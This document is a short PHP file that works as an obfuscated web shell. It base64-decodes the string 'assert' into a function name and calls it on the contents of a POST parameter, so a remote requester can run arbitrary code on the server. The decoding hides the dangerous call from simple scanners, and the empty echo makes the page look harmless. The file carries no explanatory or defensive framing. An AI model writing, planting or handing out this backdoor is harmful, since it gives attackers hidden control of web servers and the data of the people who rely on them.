<?php
$a=@$_POST['aa'];
$b="base64_decode";
$c=$b('YXNzZXJ0');
if( $a!=$a||$c($a))
echo '';
?>